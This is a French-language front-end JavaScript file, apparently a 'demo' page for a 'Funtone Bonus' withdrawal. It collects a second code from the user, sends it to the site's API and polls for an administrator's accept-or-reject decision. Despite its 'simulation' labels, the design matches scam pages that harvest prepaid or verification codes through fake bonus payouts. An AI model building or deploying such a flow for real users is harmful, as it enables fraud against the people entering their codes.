// ============================================
// FUNTONE BONUS INTERNATIONAL
// DEUXIÈME CODE FICTIF
// ============================================

const API = window.location.origin;

// ============================================
// ÉLÉMENTS HTML
// ============================================

const withdrawBtn = document.getElementById("withdrawBtn");

const codeModal = document.getElementById("codeModal");

const closeModal = document.getElementById("closeModal");

const secondCodeForm = document.getElementById("secondCodeForm");

const secondDemoCode = document.getElementById("secondDemoCode");

const sendSecondCode = document.getElementById("sendSecondCode");

const secondMessage = document.getElementById("secondMessage");

const successModal = document.getElementById("successModal");

const finishBtn = document.getElementById("finishBtn");

// ============================================
// RÉCUPÉRER LA RÉFÉRENCE
// ============================================

const parametres = new URLSearchParams(
    window.location.search
);

const reference = parametres.get("reference");

// ============================================
// VARIABLES
// ============================================

let verificationEnCours = false;

let intervalleVerification = null;

let deuxiemeCodeEnvoye = false;

// ============================================
// FONCTIONS DES FENÊTRES
// ============================================

function ouvrirModal(modal) {

    modal.classList.add("active");

    modal.setAttribute("aria-hidden", "false");
}

function fermerModal(modal) {

    modal.classList.remove("active");

    modal.setAttribute("aria-hidden", "true");
}

// ============================================
// AFFICHER UN MESSAGE
// ============================================

function afficherMessage(texte, couleur) {

    secondMessage.textContent = texte;

    secondMessage.style.color = couleur;
}

// ============================================
// VÉRIFIER LA RÉFÉRENCE
// ============================================

if (!reference) {

    withdrawBtn.disabled = true;

    withdrawBtn.textContent = "Participation introuvable";

    afficherMessage(
        "Référence de participation manquante.",
        "#D32F2F"
    );
}

// ============================================
// REQUÊTE API
// ============================================

async function requete(url, options = {}) {

    const response = await fetch(url, {
        ...options,
        cache: "no-store"
    });

    const texte = await response.text();

    let resultat;

    try {

        resultat = JSON.parse(texte);

    } catch (erreur) {

        throw new Error(
            "Réponse incorrecte du serveur."
        );
    }

    if (!response.ok) {

        throw new Error(
            resultat.message || "Une erreur est survenue."
        );
    }

    return resultat;
}

// ============================================
// VÉRIFIER LA PREMIÈRE ÉTAPE
// ============================================

async function verifierPremiereEtape() {

    if (!reference) {
        return false;
    }

    try {

        const resultat = await requete(
            `${API}/api/demo-codes/premier/${encodeURIComponent(reference)}`
        );

        if (resultat.statut !== "simulation_acceptee") {

            afficherMessage(
                "La première étape doit être validée avant de continuer.",
                "#D32F2F"
            );

            withdrawBtn.disabled = true;

            setTimeout(function () {

                window.location.href =
                    `premier-code.html?reference=${encodeURIComponent(reference)}`;

            }, 2500);

            return false;
        }

        return true;

    } catch (erreur) {

        afficherMessage(
            erreur.message,
            "#D32F2F"
        );

        withdrawBtn.disabled = true;

        return false;
    }
}

// ============================================
// OUVRIR LA FENÊTRE DU DEUXIÈME CODE
// ============================================

withdrawBtn.addEventListener("click", function () {

    if (!reference || verificationEnCours) {
        return;
    }

    afficherMessage("", "#D96B27");

    ouvrirModal(codeModal);

    secondDemoCode.focus();
});

// ============================================
// FERMER LA FENÊTRE
// ============================================

closeModal.addEventListener("click", function () {

    if (verificationEnCours) {
        return;
    }

    fermerModal(codeModal);
});

// ============================================
// FERMER EN CLIQUANT À L'EXTÉRIEUR
// ============================================

codeModal.addEventListener("click", function (event) {

    if (
        event.target === codeModal &&
        !verificationEnCours
    ) {

        fermerModal(codeModal);
    }
});

// ============================================
// ENVOYER LE DEUXIÈME CODE
// ============================================

secondCodeForm.addEventListener("submit", async function (event) {

    event.preventDefault();

    if (!reference || verificationEnCours) {
        return;
    }

    const code = secondDemoCode.value.trim();

if (!code) {

    afficherMessage(
        "Veuillez saisir votre code.",
        "#D32F2F"
    );

    return;
}

    verificationEnCours = true;

    deuxiemeCodeEnvoye = true;

    secondDemoCode.disabled = true;

    sendSecondCode.disabled = true;

    sendSecondCode.textContent = "Transmission...";

    afficherMessage(
        "Vérification de votre code...",
        "#D96B27"
    );

    try {

        const resultat = await requete(
            `${API}/api/demo-codes/second`,
            {
                method: "POST",

                headers: {
                    "Content-Type": "application/json"
                },

                body: JSON.stringify({
                    reference: reference,
                    code: code
                })
            }
        );

        afficherMessage(
            "Code vérification. En attente...",
            "#258443"
        );

        sendSecondCode.textContent = "Validation en attente";

        demarrerVerification();

    } catch (erreur) {

        verificationEnCours = false;

        deuxiemeCodeEnvoye = false;

        secondDemoCode.disabled = false;

        sendSecondCode.disabled = false;

        sendSecondCode.textContent = "Réessayer";

        afficherMessage(
            erreur.message,
            "#D32F2F"
        );
    }
});

// ============================================
// DÉMARRER LA VÉRIFICATION AUTOMATIQUE
// ============================================

function demarrerVerification() {

    if (intervalleVerification) {

        clearInterval(intervalleVerification);
    }

    intervalleVerification = setInterval(
        verifierStatutDeuxiemeCode,
        3000
    );

    verifierStatutDeuxiemeCode();
}

// ============================================
// CONSULTER LE STATUT
// ============================================

async function verifierStatutDeuxiemeCode() {

    try {

        const resultat = await requete(
            `${API}/api/demo-codes/second/${encodeURIComponent(reference)}`
        );

        traiterStatutDeuxiemeCode(
            resultat.statut
        );

    } catch (erreur) {

        console.error(
            "Erreur de vérification :",
            erreur
        );
    }
}

// ============================================
// LA SUITE EST DANS LA PARTIE 2/2
// ============================================

// ============================================
// TRAITER LA DÉCISION DE L'ADMINISTRATEUR
// ============================================

function traiterStatutDeuxiemeCode(statut) {

    // ========================================
    // DEUXIÈME CODE ACCEPTÉ
    // ========================================

    if (statut === "simulation_acceptee") {

        clearInterval(intervalleVerification);

        verificationEnCours = false;

        afficherMessage(
            "Votre deuxième code est correct !",
            "#258443"
        );

        fermerModal(codeModal);

        ouvrirModal(successModal);

        return;
    }

    // ========================================
    // DEUXIÈME CODE REFUSÉ
    // ========================================

    if (statut === "simulation_rejetee") {

        clearInterval(intervalleVerification);

        intervalleVerification = null;

        verificationEnCours = false;

        deuxiemeCodeEnvoye = false;

        secondDemoCode.disabled = false;

        secondDemoCode.value = "";

        sendSecondCode.disabled = false;

        sendSecondCode.textContent = "Réessayer";

        afficherMessage(
            "Votre code est incorrecte.",
            "#D32F2F"
        );

        alert(
            "Bien vouloir réessayer ."
        );

        secondDemoCode.focus();

        return;
    }

    // ========================================
    // EN ATTENTE
    // ========================================

    if (statut === "simulation_en_attente") {

        afficherMessage(
            "code vérification, Veuillez patienter...",
            "#D96B27"
        );
    }
}

// ============================================
// FERMER LA FENÊTRE FINALE
// ============================================

finishBtn.addEventListener("click", function () {

    fermerModal(successModal);

    afficherMessage(
        "Votre démonstration est terminée avec succès.",
        "#258443"
    );

    withdrawBtn.disabled = true;

    withdrawBtn.textContent = "Démonstration terminée";
});

// ============================================
// VÉRIFICATION AU CHARGEMENT DE LA PAGE
// ============================================

async function initialiserDeuxiemeEtape() {

    if (!reference) {
        return;
    }

    const premiereEtapeValidee =
        await verifierPremiereEtape();

    if (!premiereEtapeValidee) {
        return;
    }

    try {

        const resultat = await requete(
            `${API}/api/demo-codes/second/${encodeURIComponent(reference)}`
        );

        // Si le deuxième code est déjà accepté
        if (resultat.statut === "simulation_acceptee") {

            withdrawBtn.disabled = true;

            withdrawBtn.textContent = "Démonstration terminée";

            ouvrirModal(successModal);

            return;
        }

        // Si le deuxième code est en attente
        if (resultat.statut === "simulation_en_attente") {

            verificationEnCours = true;

            deuxiemeCodeEnvoye = true;

            secondDemoCode.disabled = true;

            sendSecondCode.disabled = true;

            sendSecondCode.textContent = "Validation en attente";

            ouvrirModal(codeModal);

            afficherMessage(
                "Votre code est en cours de vérification...",
                "#D96B27"
            );

            demarrerVerification();

            return;
        }

        // Si le code précédent a été refusé
        if (resultat.statut === "simulation_rejetee") {

            afficherMessage(
                "Votre précédent code a été incorrecte. Vous pouvez réessayer.",
                "#D32F2F"
            );
        }

    } catch (erreur) {

        console.error(
            "Erreur initialisation :",
            erreur
        );
    }
}

// ============================================
// NETTOYAGE
// ============================================

window.addEventListener("beforeunload", function () {

    if (intervalleVerification) {

        clearInterval(intervalleVerification);
    }
});

// ============================================
// LANCEMENT
// ============================================

initialiserDeuxiemeEtape();